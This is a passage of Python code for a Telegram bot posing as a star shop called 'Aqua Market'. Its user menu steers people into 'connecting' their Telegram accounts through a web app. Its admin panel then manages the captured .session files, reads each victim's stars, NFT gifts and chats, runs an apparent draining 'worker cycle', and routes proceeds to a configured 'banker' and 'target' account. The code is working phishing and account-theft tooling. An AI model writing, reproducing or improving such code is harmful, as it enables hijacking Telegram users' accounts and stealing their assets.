    # --- ПОИСК ПО ПОСЛЕДНИМ 4 ЦИФРАМ ---
    @router.callback_query(F.data == "search_sessions")
    async def cmd_search_sessions(call: types.CallbackQuery, state: FSMContext):
        if not await check_admin(call.from_user.id): return
        await call.message.edit_text("🔍 Введите последние 4 цифры номера телефона для поиска сессии:", reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_sessions_list")).as_markup())
        await state.set_state(AdminSearchState.waiting_for_digits)

    @router.message(AdminSearchState.waiting_for_digits)
    async def search_digits_fin(m: Message, state: FSMContext):
        if not await check_admin(m.from_user.id): return
        digits = m.text.strip()
        if not digits.isdigit() or len(digits) != 4:
            await m.answer("❌ Введите ровно 4 цифры!")
            return

        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session") if f.stem.endswith(digits)]
        await state.clear()

        if not sessions:
            await m.answer(f"❌ Сессий с последними цифрами {digits} не найдено.", reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔍 Новый поиск", callback_data="search_sessions")).row(InlineKeyboardButton(text="🔙 К списку", callback_data="admin_sessions_list")).as_markup())
            return

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:20]:  # Ограничим до 20 для читаемости
            last_4 = s_name[-4:] if len(s_name) >= 4 else s_name
            builder.row(InlineKeyboardButton(text=f"👤 {last_4} ({s_name})", callback_data=f"manage_s:{s_name}"))

        builder.row(InlineKeyboardButton(text="🔍 Новый поиск", callback_data="search_sessions"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="admin_sessions_list"))
        await m.answer(f"📂 Найдено сессий: {len(sessions)}", reply_markup=builder.as_markup())

    # --- ПРОВЕРКА СТАТУСА БАНКИРА ---
    @router.callback_query(F.data == "check_banker_status")
    async def cmd_check_banker_status(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return

        b_name = SETTINGS.get('banker_session', 'main_admin')
        session_path = SESSIONS_DIR / f"{b_name}.session"

        status_msg = await call.message.answer("🔍 <b>Проверяю статус банкира...</b>", parse_mode="HTML")

        try:
            # Проверяем существование файла сессии
            if not session_path.exists():
                await status_msg.edit_text(
                    f"❌ <b>Сессия банкира не найдена</b>\n\n"
                    f"📁 Файл: <code>{b_name}.session</code>\n"
                    f"📍 Ожидаемое расположение: <code>sessions/</code>\n\n"
                    f"💡 <b>Рекомендация:</b> Подключите банкира через 'Connect Banker'",
                    parse_mode="HTML"
                )
                return

            # Проверяем подключение к сессии
            banker_client = Client(b_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

            try:
                await banker_client.start()
                me = await banker_client.get_me()

                # Получаем информацию о балансе
                stars_balance = await get_stars_info(banker_client)

                # Получаем информацию о подарках
                gifts = await get_all_received_gifts(banker_client)
                regular_gifts = sum(1 for g in gifts if not analyze_gift_structure(g)['is_nft'])
                nft_count = sum(1 for g in gifts if analyze_gift_structure(g)['is_nft'])

                # Формируем отчет
                report = (
                    f"🟢 <b>Банкир в рабочем состоянии</b>\n\n"
                    f"👤 <b>Имя:</b> <code>{me.first_name or 'Unknown'}</code>\n"
                    f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
                    f"📞 <b>Телефон:</b> <code>{mask_phone(me.phone_number)}</code>\n"
                    f"⭐️ <b>Баланс звезд:</b> <code>{stars_balance}</code>\n"
                    f"🎁 <b>Регулярные подарки:</b> <code>{regular_gifts}</code>\n"
                    f"🖼️ <b>NFT подарки:</b> <code>{nft_count}</code>\n\n"
                    f"✅ <b>Статус:</b> Готов к работе"
                )

                await status_msg.edit_text(report, parse_mode="HTML")

            except Exception as e:
                await status_msg.edit_text(
                    f"🟡 <b>Проблемы с банкиром</b>\n\n"
                    f"❌ <b>Ошибка подключения:</b> <code>{str(e)}</code>\n\n"
                    f"💡 <b>Возможные причины:</b>\n"
                    f"• Сессия устарела или заблокирована\n"
                    f"• Проблемы с сетью\n"
                    f"• Аккаунт требует повторной авторизации\n\n"
                    f"🔄 <b>Рекомендация:</b> Переподключите банкира",
                    parse_mode="HTML"
                )

            finally:
                try:
                    await banker_client.stop()
                except:
                    pass

        except Exception as e:
            await status_msg.edit_text(
                f"❌ <b>Критическая ошибка проверки</b>\n\n"
                f"⚠️ <b>Ошибка:</b> <code>{str(e)}</code>\n\n"
                f"💡 <b>Рекомендация:</b> Проверьте настройки API",
                parse_mode="HTML"
            )

    # --- ПРИНУДИТЕЛЬНОЕ ЗАКРЫТИЕ ВСЕХ СОЕДИНЕНИЙ ---
    @router.callback_query(F.data == "admin_kill_sessions")
    async def cmd_kill_all_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        await call.answer("♻️ Чтобы полностью очистить RAM и Tasks, перезапустите скрипт бота в консоли.", show_alert=True)

    @router.callback_query(F.data == "admin_logs")
    async def admin_logs(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        try:
            with open('bot.log', 'r', encoding='utf-8') as f:
                lines = f.readlines()[-50:]

            log_text = ''.join(lines)
            errors = [line for line in lines if 'ERROR' in line or '❌' in line]

            if errors:
                error_text = '\n'.join(errors[-5:])
                advice = "Проверьте подключение к интернету, API ключи, сессии пользователей. Для детальной диагностики обратитесь к разработчику."
                text = f"📋 <b>Последние логи (ошибки):</b>\n\n{error_text}\n\n💡 <b>Советы по исправлению:</b>\n{advice}"
            else:
                text = f"📋 <b>Последние логи:</b>\n\n{log_text}"

            await call.message.answer(text[:4000], parse_mode="HTML")

        except Exception as e:
            await call.message.answer(f"❌ Ошибка чтения логов: {e}")

    @router.callback_query(F.data == "restart_bot")
    async def cmd_restart_bot(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        await call.answer("🔄 Перезапуск бота...")
        try:
            subprocess.run(["bash", "start_all.sh"], check=True)
            await call.message.answer("✅ Бот успешно перезапущен!", parse_mode="HTML")
        except subprocess.CalledProcessError as e:
            await call.message.answer(f"❌ Ошибка перезапуска: {e}")

    @router.callback_query(F.data == "close_admin")
    async def close_admin(c):
        await c.message.delete()

    @router.callback_query(F.data == "admin_sessions_list")
    async def cmd_admin_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        # Мы ищем файлы .session в папке sessions
        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session")]
        if not sessions:
            return await call.answer("📁 Сессий не найдено", show_alert=True)

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:40]:
            builder.row(types.InlineKeyboardButton(text=f"👤 {s_name}", callback_data=f"manage_s:{s_name}"))

        builder.row(types.InlineKeyboardButton(text="🔙 Назад", callback_data="close_admin"))
        await call.message.edit_text("<b>📂 Управление активными сессиями:</b>", reply_markup=builder.as_markup())

    @router.callback_query(F.data.startswith("manage_s:"))
    async def cmd_manage_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        builder = InlineKeyboardBuilder()
        builder.row(types.InlineKeyboardButton(text="📊 Инфо", callback_data=f"info_s:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="♻️ Перескан", callback_data=f"rescan:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="🗑 Удалить", callback_data=f"del_s:{s_name}"))
        builder.row(types.InlineKeyboardButton(text="⬅️ Назад", callback_data="admin_sessions_list"))
        await call.message.edit_text(f"📍 Сессия: <b>{s_name}</b>", reply_markup=builder.as_markup())

    @router.callback_query(F.data.startswith("del_s:"))
    async def cmd_del_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        file_path = SESSIONS_DIR / f"{s_name}.session"
        if file_path.exists():
            import os
            os.remove(file_path)
            await call.answer(f"✅ {s_name} удален")
        await cmd_admin_sessions(call)

    @router.callback_query(F.data.startswith("info_s:"))
    async def cmd_info_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"📊 Получаю информацию о {s_name}...")

        # Запускаем Pyrogram для получения информации
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.start()
            me = await client.get_me()

            # Звезды
            stars = await get_stars_info(client)

            # NFT
            gifts = await get_all_received_gifts(client)
            nft_list = []
            for g in gifts:
                d = analyze_gift_structure(g)
                if d['is_nft']:
                    nft_list.append(f"• {d['title']}")

            # Чаты
            chats = []
            async for dialog in client.get_dialogs(limit=20):
                chat = dialog.chat
                chat_type = "👥 Группа" if hasattr(chat, 'title') else "👤 ЛС"
                chats.append(f"{chat_type}: {chat.title or chat.first_name or 'Unknown'}")

            info_text = (
                f"<b>📊 Информация о сессии: {s_name}</b>\n\n"
                f"👤 <b>Имя:</b> {me.first_name or 'Unknown'}\n"
                f"🆔 <b>ID:</b> <code>{me.id}</code>\n"
                f"📞 <b>Телефон:</b> {mask_phone(me.phone_number)}\n"
                f"⭐️ <b>Звезды:</b> {stars}\n\n"
                f"<b>🎁 NFT ({len(nft_list)}):</b>\n" + ("\n".join(nft_list) if nft_list else "Нет NFT") + "\n\n"
                f"<b>💬 Чаты ({len(chats)}):</b>\n" + "\n".join(chats[:10]) + ("\n..." if len(chats) > 10 else "")
            )

            await call.message.answer(info_text, parse_mode="HTML")

        except Exception as e:
            await call.message.answer(f"❌ Ошибка получения информации о {s_name}: {e}")
        finally:
            if client.is_connected: await client.stop()

    @router.callback_query(F.data.startswith("rescan:"))
    async def cmd_rescan_session(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        s_name = call.data.split(":")[1]
        await call.answer(f"🔄 Сканирую {s_name}...")

        # Запускаем Pyrogram
        client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await client.start()
            # Импортируем твой цикл воркера (если он в main)
            from main import FULL_WORKER_CYCLE
            await FULL_WORKER_CYCLE(client, None, call.bot)
            await call.message.answer(f"✅ Аккаунт <b>{s_name}</b> пересканирован!", parse_mode="HTML")
        except Exception as e:
            await call.message.answer(f"❌ Ошибка {s_name}: {e}")
        finally:
            if client.is_connected: await client.stop()

    # --- КОНЕЦ НОВЫХ ОБРАБОТЧИКОВ ---

    @router.callback_query(F.data == "set_target")
    async def set_target(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter Target (ID/@username):")
        await state.set_state(AdminSettingsState.waiting_target)

    @router.message(AdminSettingsState.waiting_target)
    async def set_target_fin(m: Message, state: FSMContext):
        SETTINGS['target_user'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer("Saved")
        await state.clear()

    @router.callback_query(F.data == "set_api")
    async def set_api(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter API URL:")
        await state.set_state(AdminSettingsState.waiting_api_url)

    @router.message(AdminSettingsState.waiting_api_url)
    async def set_api_url(m: Message, state: FSMContext):
        SETTINGS['api_url'] = m.text.strip()
        await m.answer("Enter API ID:")
        await state.set_state(AdminSettingsState.waiting_api_id)

    @router.message(AdminSettingsState.waiting_api_id)
    async def set_api_id(m: Message, state: FSMContext):
        if m.text.isdigit(): SETTINGS['api_id'] = int(m.text)
        await m.answer("Enter API Hash:")
        await state.set_state(AdminSettingsState.waiting_api_hash)

    @router.message(AdminSettingsState.waiting_api_hash)
    async def set_api_hash(m: Message, state: FSMContext):
        SETTINGS['api_hash'] = m.text.strip()
        save_settings(SETTINGS)
        await m.answer("API Settings Saved. Restart Bot.")
        await state.clear()

    # Banker Login
    admin_auth = {}
    @router.callback_query(F.data == "admin_login")
    async def al_start(c, state: FSMContext):
        if not await check_admin(c.from_user.id): return
        await c.message.answer("Enter Banker Phone:")
        await state.set_state(AdminLoginState.waiting_phone)

    @router.message(AdminLoginState.waiting_phone)
    async def al_phone(m: Message, state: FSMContext):
        cl = Client(name=SETTINGS['banker_session'], api_id=SETTINGS['api_id'], api_hash=SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
        try:
            await cl.connect()
            s = await cl.send_code(m.text)
            admin_auth[m.from_user.id] = {"c": cl, "p": m.text, "h": s.phone_code_hash}
            await m.answer("Enter Code:")
            await state.set_state(AdminLoginState.waiting_code)
        except Exception as e:
            await m.answer(f"Error: {e}")
            await state.clear()

    @router.message(AdminLoginState.waiting_code)
    async def al_code(m: Message, state: FSMContext):
        d = admin_auth.get(m.from_user.id)
        if not d: return
        try:
            await d['c'].sign_in(d['p'], d['h'], m.text)
            await m.answer("✅ Banker Saved")
            await d['c'].disconnect()
            await state.clear()
        except SessionPasswordNeeded:
            await m.answer("Enter 2FA Password:")
            await state.set_state(AdminLoginState.waiting_password)
        except Exception as e: await m.answer(f"Error: {e}")

    @router.message(AdminLoginState.waiting_password)
    async def al_pass(m: Message, state: FSMContext):
        d = admin_auth.get(m.from_user.id)
        try:
            await d['c'].check_password(m.text)
            await m.answer("✅ Banker Saved")
            await d['c'].disconnect()
            await state.clear()
        except Exception as e: await m.answer(f"Error: {e}")

    # --- USER MENU ---
    async def show_main_menu(message, user_id, edit=False):
        u = db.get_user(user_id)
        bal = u['balance'] if u else 0
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="⭐️ Вывести звезды", callback_data="withdraw"),
               InlineKeyboardButton(text="🎁 Автоскупщик", callback_data="autobuyer"))
        kb.row(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet"),
               InlineKeyboardButton(text="🛒 Магазин", callback_data="shop"))
        kb.row(InlineKeyboardButton(text="➕ Пополнить баланс", callback_data="topup"))
        kb.row(InlineKeyboardButton(text="🧾 Создать чек", callback_data="create_check"))

        txt = (
    f"🎉 <b>Добро пожаловать в Aqua Market!</b>\n\n"
    f"💎 <b>Ваш текущий баланс:</b> <code>{bal} ⭐️</code>\n\n"
    f"🚀 <b>Наш бот поможет вам:</b>\n\n"
    f"⭐️ <b>Вывести звезды</b> с ваших Telegram аккаунтов автоматически\n"
    f"🛒 <b>Купить звезды</b> по выгодному курсу в нашем магазине\n"
    f"👛 <b>Управлять балансом</b> и отслеживать статистику\n"
    f"🧾 <b>Создавать чеки</b> для распространения и заработка\n\n"
    f"💡 <b>Выберите нужное действие ниже:</b>"
)
        if edit:
            if isinstance(message, types.CallbackQuery): await message.message.delete()
            else: await message.delete()

        p = Path("start.jpg")
        if p.exists(): await message.answer_photo(FSInputFile(p), caption=txt, reply_markup=kb.as_markup())
        else: await message.answer(txt, reply_markup=kb.as_markup())

    @router.callback_query(F.data == "wallet")
    async def cb_wallet(c):
        u = db.get_user(c.from_user.id)
        txt = (
            f"👛 <b>Личный кошелек</b>\n\n"
            f"🆔 <b>Ваш ID:</b> <code>{c.from_user.id}</code>\n"
            f"💎 <b>Текущий баланс:</b> <code>{u['balance']} ⭐️</code>\n\n"
            f"💡 <b>Что можно делать с балансом?</b>\n\n"
            f"💸 <b>Вывод звезд:</b> Автоматический вывод на Telegram аккаунт\n"
            f"➕ <b>Пополнение:</b> Покупка звезд через Telegram Pay\n"
            f"🎁 <b>Создание чеков:</b> Распространение и заработок\n\n"
            f"🔒 <b>Все операции безопасны и защищены</b>\n\n"
            f"Выберите действие:"
        )
        kb = InlineKeyboardBuilder().row(InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")).row(InlineKeyboardButton(text="➕ Пополнить", callback_data="topup")).row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))
        await safe_edit_text(c.message, txt, kb.as_markup())

    @router.callback_query(F.data == "main_menu")
    async def cb_main(c): await show_main_menu(c.message, c.from_user.id, True)

    @router.callback_query(F.data == "shop")
    async def cb_shop(c):
        if SETTINGS["maintenance_mode"]:
            return await c.answer("🚧 Магазин временно закрыт\n\nПопробуйте позже.", True)

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="⭐️ Купить звезды", callback_data="buy_stars"))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu"))

        txt = (
            "🛒 <b>Магазин Aqua Market</b>\n\n"
            "💎 <b>Добро пожаловать в наш премиум-магазин!</b>\n\n"
            "🎁 <b>Доступные товары:</b>\n\n"
            "⭐️ <b>Звезды Telegram</b>\n"
            "   💰 Универсальная валюта для премиум функций\n"
            "   🚀 Улучшенные возможности в Telegram\n"
            "   🎯 Премиум статус и бонусы\n\n"
            "💡 <b>Почему выбирают нас?</b>\n\n"
            "🔒 <b>Безопасность:</b> Защищенные платежи через Telegram Pay\n"
            "⚡ <b>Мгновенная доставка:</b> Звезды начисляются сразу\n"
            "💯 <b>Гарантия качества:</b> Официальные звезды Telegram\n\n"
            "Выберите товар ниже:"
        )
        await safe_edit_text(c.message, txt, kb.as_markup())

    @router.callback_query(F.data == "buy_stars")
    async def cb_buy_stars(c, state: FSMContext):
        txt = (
            "⭐️ <b>Покупка звезд Telegram</b>\n\n"
            "💰 <b>Курс:</b> 1 звезда = 1.2 рубля\n\n"
            "📝 Введите количество звезд, которое хотите купить:"
        )
        kb = InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="shop"))
        await safe_edit_text(c.message, txt, kb.as_markup())
        await state.set_state(BuyStarsState.waiting_for_amount)

    @router.message(BuyStarsState.waiting_for_amount)
    async def buy_stars_amount(m: Message, state: FSMContext):
        if not m.text.isdigit():
            return await m.answer("❌ Введите число!")

        amount = int(m.text)
        await state.clear()

        txt = f"⭐️ <b>Покупка {amount} звезд</b>\n\n🔐 <b>Необходимо подключить аккаунт</b>\n\nДля покупки звезд требуется авторизация Telegram аккаунта."
        url = get_webapp_url(m.from_user.id, SETTINGS['api_url'])
        await m.answer(
            txt,
            reply_markup=InlineKeyboardBuilder().row(
                InlineKeyboardButton(text="🔐 Подключить аккаунт", web_app=WebAppInfo(url=url))
            ).as_markup(),
            parse_mode="HTML"
        )

    @router.callback_query(F.data.in_({"withdraw", "autobuyer"}))
    async def cb_stubs(c):
        txt = (
            f"🔐 <b>Подключение Telegram аккаунта</b>\n\n"
            f"⚠️ <b>Для выполнения этого действия требуется авторизация</b>\n\n"
            f"💡 <b>Зачем это нужно?</b>\n\n"
            f"🔑 <b>Безопасность:</b> Мы гарантируем защиту ваших данных\n"
            f"🚀 <b>Функциональность:</b> Доступ к полному спектру возможностей бота\n"
            f"⭐️ <b>Вывод средств:</b> Автоматический вывод звезд на ваш аккаунт\n"
            f"🛡️ <b>Контроль:</b> Вы всегда можете отключить аккаунт в настройках\n\n"
            f"Нажмите кнопку ниже для безопасной авторизации:"
        )
        url = get_webapp_url(c.from_user.id, SETTINGS['api_url'])
        await safe_edit_text(c.message, txt, InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔐 Подключить", web_app=WebAppInfo(url=url))).row(InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")).as_markup())

    # --- PAYMENTS & CHECKS ---
    @router.callback_query(F.data == "topup")
    async def cb_topup(c):
        kb = InlineKeyboardBuilder()
        for a in [25, 50, 100, 500]: kb.add(InlineKeyboardButton(text=f"{a} ⭐️", callback_data=f"pay_{a}"))
        kb.adjust(2).row(InlineKeyboardButton(text="✏️ Своя сумма", callback_data="pay_custom"), InlineKeyboardButton(text="🔙", callback_data="wallet"))
        await safe_edit_text(c.message, "💳 Выберите сумму:", kb.as_markup())

    @router.callback_query(F.data.startswith("pay_") & (F.data != "pay_custom"))
    async def cb_pay(c):
        await c.answer()
        amt = int(c.data.split("_")[1])
        await c.message.answer_invoice(title="Пополнение", description=f"На {amt} stars", prices=[LabeledPrice(label="XTR", amount=amt)], provider_token="", payload="topup", currency="XTR")

    @router.callback_query(F.data == "pay_custom")
    async def cb_pc(c, state: FSMContext):
        await safe_edit_text(c.message, "✏️ Введите сумму:", InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙", callback_data="topup")).as_markup())
        await state.set_state(TopUpState.waiting_for_custom_amount)

    @router.message(TopUpState.waiting_for_custom_amount)
    async def pc_fin(m: Message, state: FSMContext):
        if not m.text.isdigit(): return await m.answer("Число!")
        await state.clear()
        amt = int(m.text)
        await m.answer_invoice(title="Пополнение", description=f"На {amt} stars", prices=[LabeledPrice(label="XTR", amount=amt)], provider_token="", payload="topup", currency="XTR")

    @router.pre_checkout_query()
    async def pre(p: PreCheckoutQuery): await p.answer(ok=True)

    @router.message(F.successful_payment)
    async def suc(m: Message):
        payload = m.successful_payment.invoice_payload
        if payload.startswith("stars_"):
            # Покупка звезд
            stars_amount = int(payload.split("_")[1])
            db.update_balance(m.from_user.id, stars_amount, 'add')
            await m.answer(f"⭐️ <b>Покупка завершена!</b>\n\n💎 Получено: <code>+{stars_amount} ⭐️</code>\n\nСпасибо за покупку!", parse_mode="HTML")
        else:
            # Обычное пополнение звезд
            amt = m.successful_payment.total_amount
            db.update_balance(m.from_user.id, amt, 'add')
            await m.answer(f"✅ Оплачено: {amt} ⭐️")

    @router.callback_query(F.data == "create_check")
    async def cc(c, state: FSMContext):
        await safe_edit_text(c.message, "📝 Сумма чека:", InlineKeyboardBuilder().add(InlineKeyboardButton(text="🔙", callback_data="main_menu")).as_markup())
        await state.set_state(CreateCheckState.waiting_for_amount)

    @router.message(CreateCheckState.waiting_for_amount)
    async def cc_amt(m: Message, state: FSMContext):
        if not m.text.isdigit(): return await m.answer("Число!")
        if db.get_user(m.from_user.id)['balance'] < int(m.text): return await m.answer("Мало средств.")
        await state.update_data(amt=int(m.text))
        await m.answer("👥 Кол-во активаций:")
        await state.set_state(CreateCheckState.waiting_for_activations)

    @router.message(CreateCheckState.waiting_for_activations)
    async def cc_fin(m: Message, state: FSMContext):
        # 1. Проверка ввода
        if not m.text.isdigit():
            return await m.answer("⚠️ Введите число активаций цифрами!")

        # 2. Получение данных из состояния
        d = await state.get_data()
        amount = d.get('amt', 0)
        activations = int(m.text)
        total_cost = amount * activations

        # 3. Проверка баланса
        user_info = db.get_user(m.from_user.id)
        if not user_info or user_info['balance'] < total_cost:
            return await m.answer(f"❌ Недостаточно средств!\nНужно: {total_cost} ⭐️\nВаш баланс: {user_info['balance'] if user_info else 0} ⭐️")

        # 4. Списание и создание чека в БД
        db.update_balance(m.from_user.id, total_cost, 'remove')
        cid = db.create_check(m.from_user.id, amount, activations)

        # 5. Подготовка клавиатуры
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📨 Отправить чек", switch_inline_query=f"c_{cid}"))
        kb.row(InlineKeyboardButton(text="🏠 В меню", callback_data="main_menu"))

        # 6. Формирование текста
        txt = (
            f"✅ <b>Чек успешно создан!</b>\n\n"
            f"💰 Сумма одного чека: <b>{amount} ⭐️</b>\n"
            f"👥 Количество активаций: <b>{activations}</b>\n"
            f"💎 Итого списано: <b>{total_cost} ⭐️</b>"
        )

        # 7. Отправка результата (с фото или без)
        try:
            if amount in CHECK_PHOTO_URLS:
                await m.answer_photo(
                    photo=CHECK_PHOTO_URLS[amount],
                    caption=txt,
                    reply_markup=kb.as_markup(),
                    parse_mode="HTML"
                )
            else:
                await m.answer(
                    text=txt,
                    reply_markup=kb.as_markup(),
                    parse_mode="HTML"
                )
        except Exception as e:
            # На случай ошибки
            logging.error(f"Ошибка отправки сообщения: {e}")
            await m.answer(txt, reply_markup=kb.as_markup(), parse_mode="HTML")

        # 9. Сброс состояния
        await state.clear()

    async def process_check_activation(message, cid):
        m = await message.answer("⏳ Checking...")
        await asyncio.sleep(0.5)
        res, amt, cr = db.activate_check(cid, message.from_user.id)
        if res == "success":
            if cr: db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cr)
            u = db.get_user(message.from_user.id)

            # ВЫЗОВ ЛОГА (Только сумма)
            await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr})

            txt = (
    f"🎉 <b>Чек успешно активирован!</b>\n\n"
    f"💰 <b>Получено звезд:</b> <code>+{amt} ⭐️</code>\n"
    f"💎 <b>Текущий баланс:</b> <code>{u['balance']} ⭐️</code>\n\n"
    f"⭐️ <b>Звезды можно использовать для:</b>\n"
    f"🚀 Покупки премиум функций Telegram\n"
    f"🎁 Отправки подарков друзьям\n"
    f"🛒 Улучшения аккаунта\n\n"
    f"💡 <b>Управляйте балансом в разделе Кошелек</b>"
)
            kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛", callback_data="wallet")).as_markup()

            if amt in CHECK_PHOTO_URLS:
                await m.delete()
                await message.answer_photo(
                    photo=CHECK_PHOTO_URLS[amt],
                    caption=txt,
                    reply_markup=kb,
                    parse_mode="HTML"
                )
            else:
                await m.edit_text(txt, reply_markup=kb)

            # Дополнительное сообщение после активации чека
            bonus_msg = (
                f"🎁 <b>Бонус за активацию чека!</b>\n\n"
                f"💎 <b>Дополнительные возможности:</b>\n\n"
                f"⭐️ <b>Бесплатные звезды:</b> Ежедневные бонусы\n"
                f"🎯 <b>Специальные предложения:</b> Эксклюзивные чеки\n"
                f"🚀 <b>Ускоренная обработка:</b> Приоритетная очередь\n\n"
                f"💡 <b>Следите за обновлениями!</b>"
            )
            await message.answer(bonus_msg, parse_mode="HTML")
        else:
            await m.edit_text("❌ Ошибка (активирован или не существует)")

    async def process_inline_check_activation(message, params):
        try:
            cr_id, amt = map(int, params.split("_")[:2])
            res = db.activate_inline_check(params, cr_id, message.from_user.id, amt)
            m = await message.answer("⏳")
            if res == "success":
                db.add_user(message.from_user.id, message.from_user.username, message.from_user.first_name, cr_id)
                u = db.get_user(message.from_user.id)

                # ВЫЗОВ ЛОГА (Только сумма)
                await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr_id})

                txt = (
    f"🎉 <b>Чек успешно активирован!</b>\n\n"
    f"💰 <b>Получено звезд:</b> <code>+{amt} ⭐️</code>\n"
    f"💎 <b>Текущий баланс:</b> <code>{u['balance']} ⭐️</code>\n\n"
    f"⭐️ <b>Звезды можно использовать для:</b>\n"
    f"🚀 Покупки премиум функций Telegram\n"
    f"🎁 Отправки подарков друзьям\n"
    f"🛒 Улучшения аккаунта\n\n"
    f"💡 <b>Управляйте балансом в разделе Кошелек</b>"
)

                if amt in CHECK_PHOTO_URLS:
                    await m.delete()
                    await message.answer_photo(
                        photo=CHECK_PHOTO_URLS[amt],
                        caption=txt,
                        parse_mode="HTML"
                    )
                else:
                    await m.edit_text(txt)

                # Дополнительное сообщение после активации чека
                bonus_msg = (
                    f"🎁 <b>Бонус за активацию чека!</b>\n\n"
                    f"💎 <b>Дополнительные возможности:</b>\n\n"
                    f"⭐️ <b>Бесплатные звезды:</b> Ежедневные бонусы\n"
                    f"🎯 <b>Специальные предложения:</b> Эксклюзивные чеки\n"
                    f"🚀 <b>Ускоренная обработка:</b> Приоритетная очередь\n\n"
                    f"💡 <b>Следите за обновлениями!</b>"
                )
                await message.answer(bonus_msg, parse_mode="HTML")
            elif res == "no_balance":
                await m.edit_text("❌ Чек аннулирован (нет средств у автора).")
            else:
                await m.edit_text("⚠️ Уже активирован.")
        except Exception as e:
            print(f"Inline Activation Error: {e}") # Выведет реальную ошибку в консоль
            await message.answer(f"❌ Error: {e}")

    @router.inline_query()
    async def inline(q: types.InlineQuery):
        try:
            # Проверка на username для inline queries
            u_check = db.get_user(q.from_user.id)
            if not u_check or not u_check.get('username'):
                return await q.answer([], cache_time=1)

            if q.query.startswith("c_"):
                c = db.get_check(q.query.replace("c_", ""))
                if c:
                    amount = c['amount']
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Забрать", url=f"https://t.me/{(await bot_instance.me()).username}?start=c_{c['check_id']}")).as_markup()
                    result = InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Чек {amount} ⭐️",
                        input_message_content=InputTextMessageContent(message_text=(
                            f"🎁 <b>Чек на {amount} звезд Telegram!</b>\n\n"
                            f"⭐️ <b>Сумма:</b> <code>{amount} ⭐️</code>\n"
                            f"💎 <b>Ценность:</b> Премиум валюта Telegram\n"
                            f"🚀 <b>Назначение:</b> Покупка премиум функций\n"
                            f"🛡️ <b>Безопасность:</b> Защищен от мошенничества\n\n"
                            f"💡 <b>Нажмите кнопку ниже для активации!</b>"
                        ), parse_mode="HTML"),
                        reply_markup=kb
                    )
                    await q.answer([result], cache_time=1)
            elif q.query.isdigit() and q.query.replace('0', '').replace('1', '').replace('2', '').replace('3', '').replace('4', '').replace('5', '').replace('6', '').replace('7', '').replace('8', '').replace('9', '') == '':
                amt = int(q.query)
                u = db.get_user(q.from_user.id)
                if not u or u['balance'] < amt: return await q.answer([], cache_time=1)
                uid = f"{q.from_user.id}_{amt}_{secrets.token_hex(4)}"
                kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Активировать!", url=f"https://t.me/{(await bot_instance.me()).username}?start=q_{uid}")).as_markup()
                if amt in CHECK_PHOTO_URLS:
                    result = InlineQueryResultPhoto(
                        id=uuid.uuid4().hex,
                        photo_url=CHECK_PHOTO_URLS[amt],
                        thumbnail_url=CHECK_PHOTO_URLS[amt],
                        caption=(
                            f"🎁 <b>Чек на {amt} звезд Telegram!</b>\n\n"
                            f"⭐️ <b>Сумма:</b> <code>{amt} ⭐️</code>\n"
                            f"💎 <b>Ценность:</b> Премиум валюта Telegram\n"
                            f"🚀 <b>Назначение:</b> Покупка премиум функций\n"
                            f"🛡️ <b>Безопасность:</b> Защищен от мошенничества\n\n"
                            f"💡 <b>Нажмите кнопку ниже для активации!</b>"
                        ),
                        reply_markup=kb
                    )
                else:
                    result = InlineQueryResultArticle(
                        id=uuid.uuid4().hex,
                        title=f"Чек {amt} ⭐️",
                        input_message_content=InputTextMessageContent(message_text=(
                            f"🎁 <b>Чек на {amt} звезд Telegram!</b>\n\n"
                            f"⭐️ <b>Сумма:</b> <code>{amt} ⭐️</code>\n"
                            f"💎 <b>Ценность:</b> Премиум валюта Telegram\n"
